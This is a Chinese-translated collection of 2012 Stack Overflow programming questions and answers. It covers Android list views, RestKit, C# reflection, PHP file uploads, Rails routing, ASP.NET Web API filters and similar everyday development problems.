> 时间：2012-10-06T14:30:25.633

您可以使用媒体查询。 [http://css-tricks.com/css-media-queries/](http://css-tricks.com/css-media-queries/)

[http://cssmediaqueries.com/](http://cssmediaqueries.com/)

只需将不同的样式应用于容器并根据视口大小换出图像。当然，这需要将图像设置为背景，而不是使用 img 标签。

# android - 滚动列表视图到选定位置

> ID：12760655
> 
> 赞同：0
> 
> 时间：2012-10-06T14:26:04.007
> 
> 标签：android, listview, scroll, position

下面的屏幕快照说明了一个显示五个项目的列表视图，每个项目由两部分组成：A 和 B。列表视图最初显示这五个项目，默认情况下隐藏每个项目的 B 部分。用户应该能够单击 A 部分以显示或隐藏相应的 B 部分。如果用户点击第五个项目，我想将整个列表视图向上移动到 5 以上（包括 A 部分）以腾出空间第五项 B 部分。或者如果你想显示第四个项目的 B 部分，在点击第四个项目后我想向下移动项目 5 为项目 4 的 B 部分腾出空间。底线，如果我们点击一​​个项目，我们想要移动列表视图的位置，以确保我们有空间容纳新暴露的部分 B。

我知道这`listview.setSelection(3)`会将定位的项目滚动到列表的顶部。而且我也很熟悉`listview.smoothScrollToPosition(8)`，但是这个方法需要api 8，但是我们的项目使用的是版本7。

我在上述动画方面取得了一些进展，但无法确保列表视图项保持（或滚动）到正确的位置。当我扩展和收缩特定项目时，如何控制更广泛的列表视图的位置？

![B 部分隐藏然后显示的示例屏幕快照](../Images/b09b9c3a50c3ebf87ff7e9579da2e4a5.png)

* * *

这是代码：

```
/**
 * 类SubCategoryAdapter.java的实现描述：TODO 类实现描述
 * @author xianyi.chengxy 2012-8-17 下午7:39:47
 */
public class SubCategoryAdapter extends BaseListAdapter<IndustryNavigationData> {
    private Context mContext ;
    private LayoutInflater mInflater ;
    private ListView mListView ;

    static String defaultName = "subCategory.png" ;

    private int mPreVisiPosition = -1 ;
    private int mVisiPosition = -1 ;

    public SubCategoryAdapter( Context context , int visiPosition, ListView  listView ){
        super(context) ;
        this.mContext = context.getApplicationContext()  ;
        this.mInflater = LayoutInflater.from(mContext) ;
        this.mVisiPosition = visiPosition ;
        this.mListView = listView ;
    }
    public void setVisiPosition(int visiPosition){
        this.mVisiPosition = visiPosition ;
    }

    @Override
    public View getView(int position, View convertView, ViewGroup parent) {
        if( convertView == null ){
            convertView = mInflater.inflate(R.layout.v2_subcategory_listitem, null) ;
            NoScrollGridView gridView = (NoScrollGridView) convertView.findViewById(R.id.subCategory_groupView_gridView) ;
            gridView.setNumColumns(5) ;

            final BaseListAdapter<IndustryNavigationData> listAdapter = new SubCategoryGridViewAdapter(mContext) ;
            gridView.setAdapter(listAdapter) ;
            gridView.setTag(listAdapter) ;

            ViewHold viewHold = new ViewHold() ;
            viewHold.gridLayout = (LinearLayout) convertView.findViewById(R.id.subCategory_groupView_gridViewLayout) ;
            viewHold.imageView = (ImageView_) convertView.findViewById(R.id.subCategory_groupView_imageview) ;
            viewHold.name = (TextView) convertView.findViewById(R.id.subCategory_groupView_name) ;
            viewHold.childsName = (TextView) convertView.findViewById(R.id.subCategory_groupView_childs) ;
            viewHold.gridView = gridView ;
            // TO search
            viewHold.gridView.setOnItemClickListener(new OnItemClickListener() {
                @Override
                public void onItemClick(AdapterView<?> parent, View view,
                                        int position, long id) {
                    UILogUtils.saveAndAppendLogType(LogTypeCode.APP_DRESSCATEGORY_BROWSER_TWO);
                    MyOfferRequest request = new MyOfferRequest();
                    IndustryNavigationData item = listAdapter.getItem(position);
                    if (IndustryNavigationDataType.LEFT_CATEGORY.equals(item
                                                                        .getType())) {
                        request.setCategoryId(item.getId());
                        request.setCategoryName(item.getName());
                    } else if (IndustryNavigationDataType.LEFT_KEYWORD
                               .equals(item.getType())) {
                        request.setCategoryId(item.getId());
                        request.setKeywords(item.getName());
                    }
                    ActivityUtil.gotoSearchOfferList(request, mContext, true);
                }
            });

            viewHold.groupLayout = convertView.findViewById(R.id.subCategory_groupLayout) ;
            viewHold.groupLayout.setOnClickListener(clickListener) ;
            convertView.setTag(viewHold) ;
        }

        ViewHold viewHold = (ViewHold) convertView.getTag() ;
        viewHold.position = position ;
        IndustryNavigationData item = group.get(position) ;
        viewHold.groupLayout.setTag(viewHold) ;

        String url = item.getImageUrl() ;
        if( url != null ){
            viewHold.imageView.setImageResource(item.getImageUrl(), 110, 110, R.drawable.default_image) ;
        }

        viewHold.name.setText( item.getName() );
        StringBuffer sb = new StringBuffer() ;
        List<IndustryNavigationData> childs = item.getChildren() ;
        if( (childs!=null) && (childs.size()!=0) ){
            for( IndustryNavigationData itemChild : item.getChildren() ){
                sb.append(itemChild.getName()).append("/") ;
            }
            sb.deleteCharAt(sb.length()-1) ;
            viewHold.childsName.setText(sb.toString()) ;
        }else{
            viewHold.childsName.setText("") ;
        }

        BaseListAdapter<IndustryNavigationData> gridViewAdapter = (BaseListAdapter<IndustryNavigationData>) viewHold.gridView.getTag() ;
        gridViewAdapter.setList(item.getChildren()) ;
        if( (this.mVisiPosition==position) && (item.getChildren()!=null) && (item.getChildren().size()!=0) ){
            scrollView(viewHold, item, ExpandCollapseAnimation.EXPAND);
            viewHold.gridLayout.setVisibility(View.VISIBLE) ;
        }else{
            if( position == this.mPreVisiPosition ){
                //    viewHold.gridLayout.setVisibility(View.GONE) ;
                mPreVisiPosition = -1 ;
                scrollView(viewHold, item, ExpandCollapseAnimation.COLLAPSE);
            }else{
                viewHold.gridLayout.setVisibility(View.GONE) ;
            }
        }

        return convertView;
    }
    private class ViewHold{
        public int position ;
        public View groupLayout ;
        public LinearLayout gridLayout ;
        public ImageView_ imageView ;
        public TextView name ;
        public TextView childsName ;
        public NoScrollGridView gridView ;
    }

    OnClickListener clickListener = new OnClickListener() {
        @Override
        public void onClick(View v) {
            UILogUtils.saveAndAppendLogType(LogTypeCode.APP_DRESSCATEGORY_BROWSER_ONE);
            ViewHold hold = (ViewHold) v.getTag() ;
            if( (mVisiPosition!=hold.position) ||  (hold.gridLayout.getVisibility()!=View.VISIBLE) ){
                mPreVisiPosition = mVisiPosition ;
                mVisiPosition = hold.position ;
                notifyDataSetChanged() ;
                //    scrollView(hold, getItem(mVisiPosition), ExpandCollapseAnimation.EXPAND) ;
                //    mListView.setSelection(mVisiPosition-1) ;
            }else{
                mPreVisiPosition = mVisiPosition ;
                mVisiPosition = -1 ;
                notifyDataSetChanged() ;
                //    notifyDataSetChanged() ;
            }
        }
    };

    /**
     * @param viewHold
     * @param item
     */
    private void scrollView(ViewHold viewHold, IndustryNavigationData item, int scrollType) {
        int childSize = item.getChildren().size() ;
        int row = childSize / 5 ;
        row = childSize%5==0? row:row+1 ;
        LayoutParams lp = viewHold.gridLayout.getLayoutParams() ;
        int heightDip = 37+(row-1)*13 ;
        int heightPx = DisplayUtil.dipToPixel(heightDip)+row*98 ;
        int time = heightPx*2 ;
        lp.height = heightPx ;
        viewHold.gridLayout.setLayoutParams(lp) ;
        viewHold.gridLayout.startAnimation(new ExpandCollapseAnimation(viewHold.gridLayout, time, scrollType, mListView, viewHold.position));
    }

} 
```

# ios - RestKit RKObjectLoader 结果对象计数问题

> ID：12760663
> 
> 赞同：0
> 
> 时间：2012-10-06T14:27:32.243
> 
> 标签：ios, rest, mapping, restkit

我正在使用**RestKit 0.10.3**从我的自定义 Web 服务中请求新消息。

我的所有对象和映射都正常工作，但我面临一个关于向服务器发出的单个请求（RKObjectLoader 实例）返回的对象数量的问题。

假设我有一个`MessengerConversation`对象，它的`conversationID`属性值等于`1`，但`MessengerMessage`里面没有（这是一个空对话）。

最初，我从我的自定义 Web 服务中请求了五个新消息：

`GET /messenger/conversations/1/messages/?maxmsgcount=5`

它返回了一个 JSON 有效负载，例如：

```
{
  "messages": [
    {
      "content": "A new message.",
      "messageid": 10
    },
    {
      "content": "A new message.",
      "messageid": 9
    },
    {
      "content": "A new message.",
      "messageid": 8
    },
    {
      "content": "A new message.",
      "messageid": 7
    },
    {
      "content": "A new message.",
      "messageid": 6
    }
  ]
} 
```

目前，一切正常，可以通过回调返回`objects`的结果访问结果：`RKObjectLoader`

`[objects count] == 5`

但是在向同一个 API 请求旧的 5 条消息后，出现了一个不想要的结果：

`GET /messenger/conversations/1/messages/?maxmsgcount=5&msgsbeforeid=6`

返回 JSON 有效负载，例如：

```
{
  "messages": [
    {
      "content": "A new message.",
      "messageid": 5
    },
    {
      "content": "A new message.",
      "messageid": 4
    },
    {
      "content": "A new message.",
      "messageid": 3
    },
    {
      "content": "A new message.",
      "messageid": 2
    },
    {
      "content": "A new message.",
      "messageid": 1
    }
  ]
} 
```

问题在于`[objects count]`which 现在等于`10`而不是`5`作为接收到的 JSON 有效负载中返回的消息数。

这样，就不可能从最新返回的 JSON 有效负载中跟踪最大和最小的消息 ID，因为该`objects`数组包含引用对话内的所有消息。

```
Printing description of objects:
<__NSArrayM 0xa720a40>(
<MessengerMessage: 0xa721560> (entity: MessengerMessage; id: 0xa7021c0 <x-coredata://569C8DF6-D912-4DFF-B5A2-C462F0355B3F/MessengerMessage/p1> ; data: <fault>),
<MessengerMessage: 0x13360490> (entity: MessengerMessage; id: 0x133605a0 <x-coredata://569C8DF6-D912-4DFF-B5A2-C462F0355B3F/MessengerMessage/p2> ; data: <fault>),
<MessengerMessage: 0x13360510> (entity: MessengerMessage; id: 0xa7023a0 <x-coredata://569C8DF6-D912-4DFF-B5A2-C462F0355B3F/MessengerMessage/p3> ; data: <fault>),
<MessengerMessage: 0x13360550> (entity: MessengerMessage; id: 0xa7022b0 <x-coredata://569C8DF6-D912-4DFF-B5A2-C462F0355B3F/MessengerMessage/p4> ; data: <fault>),
<MessengerMessage: 0xa720290> (entity: MessengerMessage; id: 0xa702080 <x-coredata://569C8DF6-D912-4DFF-B5A2-C462F0355B3F/MessengerMessage/p5> ; data: <fault>),
<MessengerMessage: 0xa71ca40> (entity: MessengerMessage; id: 0x13360cf0 <x-coredata://569C8DF6-D912-4DFF-B5A2-C462F0355B3F/MessengerMessage/p6> ; data: <fault>),
<MessengerMessage: 0x12f96c40> (entity: MessengerMessage; id: 0xa7023f0 <x-coredata://569C8DF6-D912-4DFF-B5A2-C462F0355B3F/MessengerMessage/p7> ; data: <fault>),
<MessengerMessage: 0x133603c0> (entity: MessengerMessage; id: 0x13360b10 <x-coredata://569C8DF6-D912-4DFF-B5A2-C462F0355B3F/MessengerMessage/p8> ; data: <fault>),
<MessengerMessage: 0x13360380> (entity: MessengerMessage; id: 0x13360c00 <x-coredata://569C8DF6-D912-4DFF-B5A2-C462F0355B3F/MessengerMessage/p9> ; data: <fault>),
<MessengerMessage: 0xa720700> (entity: MessengerMessage; id: 0x13360a20 <x-coredata://569C8DF6-D912-4DFF-B5A2-C462F0355B3F/MessengerMessage/p10> ; data: <fault>)
) 
```

由于映射问题，我正在使用下一个设置配置所有评论的请求：

```
[objectManager loadObjectsAtResourcePath:resourcePath usingBlock:^(RKObjectLoader *loader) {
    loader.targetObject = [MessengerConversation findByPrimaryKey:query.conversationID];
    ...
}]; 
```

是否可以`RKObjectLoader`只返回从最新接收的 JSON 有效负载映射的对象？

我想我错过了一些东西，但我无法弄清楚。

提前致谢。

皮瓦

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-10-06T18:32:33.170

我可以通过更新在对象中插入加载`MessengerMessage`实例的方式来解决这个问题`MessengerConversation`。

我没有使用`RKObjectLoader`“targetObject”属性来定义从哪个会话加载消息开始，而是使用`RKObjectLoaderDelegate`“objectLoader:willMapData:”方法手动将`conversationid`密钥插入到每个加载的消息中。

然后我只是将`MessengerMessage`映射设置为我的自定义映射提供程序以处理下一个命令：

```
[objectMappingMessage mapKeyPath:@"conversationid" toAttribute:@"conversationID"];
[objectMappingMessage hasOne:@"conversation_" withMapping:objectMappingConversation];
[objectMappingMessage connectRelationship:@"conversation_" withObjectForPrimaryKeyAttribute:@"conversationID"]; 
```

现在只有加载的消息（来自当前 JSON 有效负载）`objects`从 RKObjectLoader 回调返回到数组中。

另外，感谢@blakewatters 努力回答我在 IRC 上的一些问题。

# c#-4.0 - 反射不反映 C# 接口中的方法

> ID：12760666
> 
> 赞同：0
> 
> 时间：2012-10-06T14:27:50.017
> 
> 标签：c#-4.0, dynamic, system.reflection

我无法弄清楚这段代码是怎么回事。"command" = `Park`, 接口中存在 Park 方法。然而，“方法”只是等于 null，所以当我点击调用时它会引发异常。调试器启动，因此我能够确保一切正常。为什么方法没有设置？

范围对象已定义。它是一个 com 对象。我扩展了范围对象的动态视图，它显示的只是属性或其他东西（蓝色 3d 框，不是手和纸），没有方法。那是问题吗？但是为什么，因为我指的是 ITelescope 并且在我尝试调用未设置的方法之前不对范围做任何事情。

[我从这个问题](https://stackoverflow.com/q/12319422/258482)中得到了激活码。

```
ITelescope scope = (ITelescope)Activator.CreateInstance(Type.GetTypeFromProgID(scopeProgID));
var method = typeof(ITelescope).GetMethod(command);
method.Invoke( scope, new object[0]{ } ); 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-10-06T16:17:30.983

我记得我曾问过[另一个](https://stackoverflow.com/a/12407213/258482)关于接口和反射的问题。该问题与互操作类型有关。要修复它，请右键单击项目引用列表中的违规引用，单击属性，然后将“嵌入互操作类型”设置为 false。

# php - 文件上传问题

> ID：12760667
> 
> 赞同：0
> 
> 时间：2012-10-06T14:27:50.513
> 
> 标签：php, html

我想上传视频，音频，图像，pdf，ppt，word文件，然后将它们保存到一个目录中......这是我的上传代码，.,,，没有错误但也没有输出......当我打开文件夹，里面没有图像文件……另外，如果你们告诉我应该如何上传 pdf、word 和视频文件，那将非常有帮助……

继承人我到目前为止：

这是 add-material.php

```
<form id="form" method="post" action="add-material-action.php" enctype="multipart/form-data">
<label for="file">Upload Your File Here:</label><input type="file" name="uploadedfile" id="uploadedfile"/><br /><br />

<input class="mybutton" type="submit" name="Add Material" class="button"  value="Add  Material" /> 
```

因为我的表格很大所以我在这里粘贴相关的代码行

这是 add-material-action.php

```
$allowedExts = array("jpg", "jpeg", "gif", "png");
$extension = end(explode(".", $_FILES["uploadedfile"]["name"]));
if (( ($_FILES["uploadedfile"]["type"] == "image/gif")
|| ($_FILES["uploadedfile"]["type"] == "image/jpeg")
|| ($_FILES["uploadedfile"]["type"] == "image/png")
|| ($_FILES["uploadedfile"]["type"] == "image/pjpeg"))
&& ($_FILES["uploadedfile"]["size"] < 20000)
&& in_array($extension, $allowedExts))
{
 if ($_FILES["uploadedfile"]["error"] > 0)
 {
 echo "Return Code: " . $_FILES["uploadedfile"]["error"] . "<br />";
 }

 elseif (file_exists("learningmaterial/" . $_FILES["uploadedfile"]["name"]))
  {
  echo $_FILES["uploadedfile"]["name"] . " already exists. ";
  }
else
  {
  move_uploaded_file($_FILES["uploadedfile"]["tmp_name"],
  "learningmaterial/" . $_FILES["uploadedfile"]["name"]);
  echo "Stored in: " . "learningmaterial/" . $_FILES["uploadedfile"]["name"];
  }
}
else
{
 echo "Invalid file";
} 
```

提前谢谢:)

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-10-06T14:35:57.097

你已经采取 `$allowedExts = array("jpg", "jpeg", "gif", "png");`

但是你想上传视频、音频、图片、pdf、ppt、word。所以首先编辑你的扩展列表如下

`$allowedExts = array("jpg", "jpeg", "gif", "png","txt","doc","pdf","mp3");`

添加您要上传的所有扩展代码似乎非常好，请检查您是否在所需文件夹中具有上传权限

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-10-06T14:48:46.267

看来您至少应该得到一个“无效文件错误”。所以有趣的是你在处理后没有得到任何输出。

我会推荐以下内容：

类似于 $allowedExts = array("jpg", "jpeg", "gif", "png")，我会对 mime-types 做同样的事情并做一个 in_array(type, collection)

这使得向白名单添加其他扩展和 mime 类型变得容易。

我还将打印特定的错误消息以更有用

```
if (!in_array($mime, $mimeCollection)) {
   echo "Invalid mime-type";
} else if (!in_array($ext, $extCollection)) {
   echo "Invalid file extension";
} else if ($size > $max) {
   echo "File is too large";
} 

... additional checks 
```

我还将启用错误报告以查看是否发生了其他事情，因为您没有得到任何输出。

```
error_reporting(E_ALL ^ E_NOTICE); 
```

然而，我更喜欢检查我的日志，而不是在我的脚本中启用报告。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-10-06T15:05:44.770

试试这个，你需要一个 return true 才能成功

```
if(!move_uploaded_file(move_uploaded_file($_FILES["uploadedfile"]["tmp_name"],
  "learningmaterial/" . $_FILES["uploadedfile"]["name"]))
    {
        echo "can't move file";
    } 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2014-02-12T07:28:07.673

我在使用 WinSCP 时遇到了同样的问题。我所要做的就是刷新服务器端，以便我可以看到新的上传。 ![在此处输入图像描述](../Images/b5408fe0d31e94aa2df684caea930c23.png)

# android - 通过使用android中的任何api将图像发送到服务器来搜索图像的详细信息

> ID：12760670
> 
> 赞同：-1
> 
> 时间：2012-10-06T14:28:47.910
> 
> 标签：android, google-image-search

我正在开发一个应用程序，它通过使用 android 中的搜索 API 将图像发送到服务器来搜索图像的细节。我已经尝试过谷歌图片搜索 API，但它已被阻止。
我需要帮助，是否有任何其他 API 可用于通过将图像发送到服务器来搜索图像的细节？

```
public int uploadFile(String sourceFileUri) {

    String upLoadServerUri = "http://www.xxxxxxxxxxx.com";
    String fileName = sourceFileUri;
    HttpURLConnection conn = null;
    DataOutputStream dos = null;  
    String lineEnd = "\r\n";
    String twoHyphens = "--";
    String boundary = "*****";
    int bytesRead, bytesAvailable, bufferSize;
    byte[] buffer;
    int maxBufferSize = 2 * 1024 * 1024; 
    File sourceFile = new File(sourceFileUri); 

   if (!sourceFile.isFile()) {
     tv.setText("File Not Exist");
     return 0;
    }
        try { 
            // open a URL connection to the Servlet

            FileInputStream fileInputStream = new FileInputStream(sourceFile);
         URL url = new URL(upLoadServerUri);
         conn = (HttpURLConnection) url.openConnection(); // Open a HTTP  connection to  the URL
         conn.setDoInput(true); // Allow Inputs
         conn.setDoOutput(true); // Allow Outputs
         conn.setUseCaches(false); // Don't use a Cached Copy
         conn.setRequestMethod("POST");
         conn.setRequestProperty("Connection", "Keep-Alive");
         conn.setRequestProperty("ENCTYPE", "multipart/form-data");
         conn.setRequestProperty("Content-Type", "multipart/form-data;boundary=" + boundary);
         conn.setRequestProperty("uploaded_file", fileName); 
         dos = new DataOutputStream(conn.getOutputStream());

         dos.writeBytes(twoHyphens + boundary + lineEnd); 
         dos.writeBytes("Content-Disposition: form-data; name=\"uploaded_file\";filename=\""+ fileName + "\"" + lineEnd);
         dos.writeBytes(lineEnd);

         bytesAvailable = fileInputStream.available(); // create a buffer of  maximum size

         bufferSize = Math.min(bytesAvailable, maxBufferSize);
         buffer = new byte[bufferSize];

         // read file and write it into form...
         bytesRead = fileInputStream.read(buffer, 0, bufferSize);  

         while (bytesRead > 0) {
           dos.write(buffer, 0, bufferSize);
           bytesAvailable = fileInputStream.available();
           bufferSize = Math.min(bytesAvailable, maxBufferSize);
           bytesRead = fileInputStream.read(buffer, 0, bufferSize);               
          }

         // send multipart form data necesssary after file data
         dos.writeBytes(lineEnd);
         dos.writeBytes(twoHyphens + boundary + twoHyphens + lineEnd);

         // Responses from the server (code and message)
         serverResponseCode = conn.getResponseCode();
         //String serverResponseMessage = conn.getResponseMessage();

        // Log.i("uploadFile", "HTTP Response is : " + serverResponseMessage + ": " + serverResponseCode);
         if(serverResponseCode == 200){
             runOnUiThread(new Runnable() {
                  public void run() {
                      tv.setText("File Upload Completed.");
                   // Toast.makeText(MainActivity.this, "File Upload Complete.", Toast.LENGTH_SHORT).show();
                  }
              });                
         }    

         //close the streams
         fileInputStream.close();
         dos.flush();
         dos.close();

    } 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-10-06T14:40:58.437

任何制作这些 API 的大公司都会免费为开发人员提供有限数量的 API 请求的访问权限，然后他们会为此向您收费或限制访问权限，除非您与他们达成某种许可协议（不适用于独立开发商）。话虽如此，对于爱好项目或其他东西，这些可能就足够了。

例如，您可以试用 WikiMedia API：

[http://www.mediawiki.org/wiki/API:Main_page](http://www.mediawiki.org/wiki/API:Main_page)

这是一篇关于各种可用 Api 的好文章：

[http://blog.programmableweb.com/2012/02/22/203-photo-apis-flickr-foursquare-and-yahoo-image-search/](http://blog.programmableweb.com/2012/02/22/203-photo-apis-flickr-foursquare-and-yahoo-image-search/)

# python - Python - 类中异常的原因

> ID：12760676
> 
> 赞同：0
> 
> 时间：2012-10-06T14:29:37.177
> 
> 标签：python, oop, exception

我在 python 3 中学习面向对象的编程。我有一些例外，例如：

```
try:
    self.result = (...)
except urllib.error.URLError as error:
    print(error) 
```

通常，类中的所有变量都以*self*为前缀。*在错误*变量之前添加*自我：*

 *```
try:
    self.result = (...)
except urllib.error.URLError as self.error:
    print(self.error) 
```

原因：

```
SyntaxError: invalid syntax 
```

我应该在包含异常原因的变量之前跳过*self吗？*

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-10-06T14:31:05.773

`error`是你给例外的名字。它不是您班级的成员，因此没有前缀`self`.*

# c# - 在后面的 C# 代码中选择索引时，DropDownList.SelectedIndexChanged 不会触发

> ID：12760682
> 
> 赞同：0
> 
> 时间：2012-10-06T14:29:53.153
> 
> 标签：c#, asp.net

我试图在后面的 C# 代码中选择 DropDownList 中的索引，但 SelectedIndexChanged 事件不会触发。正确的方法是什么？

```
 DropDownListChapterTitles.SelectedIndex = 1;

  protected void DropDownListChapterTitles_SelectedIndexChanged(object sender, EventArgs e)
  { } 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-10-06T15:03:06.897

检查您的标记，它应该看起来像这样

```
<asp:DropDownList runat="server" ID="DropDownListChapterTitles" AutoPostBack="True"
     OnSelectedIndexChange="DropDownListChapterTitles_SelectedIndexChanged">

</asp:DropDownList> 
```

我添加了`OnSelectedIndexChange="DropDownListChapterTitles_SelectedIndexChanged"`

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-10-06T14:36:38.053

```
DropDownListChapterTitles.SelectedIndex = 1;
// Call it yourself
DropDownListChapterTitles_SelectedIndexChanged(this, null); 
```

# c# - 从 saveFileDialog 获取没有文件名的路径？

> ID：12760689
> 
> 赞同：4
> 
> 时间：2012-10-06T14:31:08.097
> 
> 标签：c#, winforms

我试图从`SaveFileDialog`没有我的文件名的情况下获取我的路径以创建一个`DirectoryInfo`对象

```
private void btnBrowseCapture_Click(object sender, EventArgs e)
{
    SaveFileDialog saveFileDialogBrowse2 = new SaveFileDialog();
    saveFileDialogBrowse2.Filter = "Pcap file|*.pcap";
    saveFileDialogBrowse2.Title = "Save an pcap File";
    saveFileDialogBrowse2.ShowDialog();

    if (saveFileDialogBrowse2.FileName != "")
    {
        string str = saveFileDialogBrowse2.FileName;

    }
} 
```

* * *

## 回答 #1

> 赞同：9
> 
> 时间：2012-10-06T14:45:35.023

您也可以[`System.IO.Path.GetDirectoryName`](https://msdn.microsoft.com/en-us/library/system.io.path.getdirectoryname.aspx)用于此目的

```
System.IO.Path.GetDirectoryName(filePath) 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-10-06T14:33:18.820

使用[System.IO.FileInfo.DirectoryName](http://msdn.microsoft.com/en-us/library/system.io.fileinfo.directoryname.aspx)属性获取文件目录的完整路径。

* * *

```
string fileName = @"C:\TMP\log.txt";
FileInfo fileInfo = new FileInfo(fileName);

Console.WriteLine(fileInfo.DirectoryName); // Output: "C:\TMP" 
```

* * *

使用您的示例：

```
string str = saveFileDialogBrowse2.FileName;

FileInfo fileInfo = new FileInfo(str);
Console.WriteLine(fileInfo.DirectoryName); 
```

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2012-10-06T14:36:55.387

```
string fileName = @"C:\TMP\log.txt";
FileInfo fileInfo = new FileInfo(fileName);

Console.WriteLine(fileInfo.DirectoryName); 
```

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2012-10-06T14:43:47.067

您可以使用[System.IO.Path.GetDirectoryName](https://msdn.microsoft.com/en-us/library/system.io.path.getdirectoryname.aspx)方法：

```
Console.WriteLine(System.IO.Path.GetDirectoryName(Filename)); 
```

# java - 玩！带有 Ebean 的框架：PersistenceException

> ID：12760690
> 
> 赞同：2
> 
> 时间：2012-10-06T14:31:18.183
> 
> 标签：java, jpa, web, playframework-2.0, ebean

我有一个`Topic`扩展类`Model`。
创建表主题的第一条记录很好，但无法创建另一条记录：

> [PersistenceException: 错误执行 DML bindLog[] 错误[错误：重复键值违反唯一约束“pk_topics”\n 详细信息：键 (id)=(1) 已存在。]]

例外当然发生在这一行：

```
topic.save(); 
```

这很奇怪，因为：

1.  它以前没有问题。
2.  该属性是用假设**自动递增**到下一个值`id`的注释定义的，但是我得到关于**重复 id**的异常。`@Id`

 ****我应该怎么做才能解决这个问题？

**类`Model`（当然不是全部，只有相关的）**：

```
@Entity
@Table (name = "topics")
public class Topic extends Model {
@Id
public long id;
public String title;
public String content;
@ManyToOne
@JoinColumn(name = "forumId")
public Forum forum;
@ManyToOne
@JoinColumn(name = "userId")
public User user;
public Date date;

public static void create(Topic topic) {
    topic.save();
} 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-10-06T20:15:38.667

我找到了解决方案。当我改回访问修饰符时`id`，`protected`它再次起作用。很奇怪，但现在它完美地工作了。

解释？****

# ruby-on-rails - 表单发送到错误的 PUT 请求

> ID：12760693
> 
> 赞同：0
> 
> 时间：2012-10-06T14:31:37.037
> 
> 标签：ruby-on-rails, ruby

我有两个用户模型；计划模型 has_many 用户。现在，我想做的是允许用户通过更改 plan_id 来升级/降级他们的计划。我已经设置了一个表单以及适当的操作，但是当我点击提交时，它似乎并没有按照 PUT 操作所说的那样做。它似乎使用了更新操作。

这是我的表格：

```
 <%= form_tag("/users/update_plan", :method => "put" ) do %>

                        <%= hidden_field_tag :plan_id, plan.id %>

                        <%= submit_tag("Change To Plan", :class => "signup") %>

                      <% end %> 
```

这是我的更新操作

```
 def update_plan
   @user = current_user
   @user.plan_id = params[:plan_id]
   @user.save
   sign_in @user
   redirect_to change_plan
  end 
```

但是，当我提交上面的表单时，它不仅没有注册更改，而且我认为它使用了 update 操作，而不是 update_plan 操作。我认为这是因为它重定向到更新操作中的内容，并且它闪烁与更新操作相同的内容。

```
 def update
    @user = current_user
    if @user.update_attributes(params[:user])
      flash[:success] = "Profile updated"
      sign_in @user
      redirect_to edit_user_path(@user)
    else
      render 'edit'
    end
  end 
```

这是我的 routes.rb 文件

```
Dentist::Application.routes.draw do

  resources :users
  resources :sessions, only: [:new, :create, :destroy]
  resources :phones, only: [:new, :create, :destroy]
  resources :find_numbers, only: [:new, :create, :destroy]  

  put 'users/update_plan'
  match '/signup',  to: 'users#new'
  match '/login',  to: 'sessions#new'
  match '/signout', to: 'sessions#destroy', via: :delete
  match '/change_plan',  to: 'users#change_plan'

  root  to: 'static_pages#home'

  match '/product_demo', to: 'static_pages#product_demo'

  match '/pricing', to: 'plans#index'

  match '/contact', to: 'static_pages#contact' 
```

这是正在发生的事情的控制台屏幕截图：

[http://stepanp.com/debug3.jpg](http://stepanp.com/debug3.jpg)

似乎说它正在使用 update_plan 操作，但是...：S

任何有关尝试使 Update_plan 操作发挥作用的帮助将不胜感激！

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-10-06T14:40:33.903

表单将发送到正确的位置 (/users/update_plan)，但它被路由到：

```
UsersController#update 
```

正如它在控制台日志的第二行中所说的那样。所以不是你期望的行动，问题出在你的路线上。试试这个列出你所有的路线：

```
rake routes 
```

可能是用户更新路线（由资源：用户创建）首先抓住了这一点：

```
PUT    /users/:id(.:format)                                   users#update 
```

对 id 的内容没有限制，格式是可选的，所以 users/update_plan 会调用 users/update 的 id 为 update_plan （实际上你可以在控制台日志截图的边缘看到这种情况，寻找:id => 参数）。

因此，我会将您的自定义路由首先移至资源：用户上方的路由文件顶部，并尝试将其更改为指向您想要的操作，不确定没有指定操作的路由会做什么......

```
 put '/users/update_plan',  to: 'users#update_plan' 
```

# c# - Web API ActionFilter 修改返回值

> ID：12760694
> 
> 赞同：24
> 
> 时间：2012-10-06T14:31:37.273
> 
> 标签：c#, asp.net-web-api, action-filter

我有一个 Web API 应用程序，我需要通过 ActionFilter 的 OnActionExecuted 方法获取一些 API 端点的返回值

我正在使用自定义属性来识别具有我需要修改的数据的端点，但我似乎无法从 HttpActionExecutedContext 中找到实际的结果对象。

谢谢你的帮助！

* * *

## 回答 #1

> 赞同：45
> 
> 时间：2012-10-06T14:49:51.530

可以通过`Response.Content`属性获取返回值。如果您的操作返回了一个对象，您可以将其强制转换`ObjectContent`为您可以获得返回值的实际实例的位置：

```
public class MyFilterAttribute : ActionFilterAttribute
{
    public override void OnActionExecuted(HttpActionExecutedContext context)
    {
        var objectContent = context.Response.Content as ObjectContent;
        if (objectContent != null)
        {
            var type = objectContent.ObjectType; //type of the returned object
            var value = objectContent.Value; //holding the returned value
        }
    }
} 
```

# asp.net - 将 Gridview 导出到现有的 Excel 文件

> ID：12760695
> 
> 赞同：-1
> 
> 时间：2012-10-06T14:31:43.347
> 
> 标签：asp.net, excel, gridview

> **可能重复：**
> [将 GridView 导出到 Excel，而不会丢失 Excel 中的网格线](https://stackoverflow.com/questions/2376204/export-gridview-to-excel-without-losing-grid-lines-in-excel)

有没有办法将 Gridview 导出到现有的 excel 文件？我已经格式化了 excel 文件，现在我希望用 gridview 或数据表填充它？谢谢！

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-10-06T19:49:15.053

您的问题的简短回答是否定的。

# ruby-on-rails - 是否可以使用 Ruby Socket 提高 ruby 应用程序的性能

> ID：12760696
> 
> 赞同：0
> 
> 时间：2012-10-06T14:31:44.063
> 
> 标签：ruby-on-rails, ruby, ruby-on-rails-3, sockets

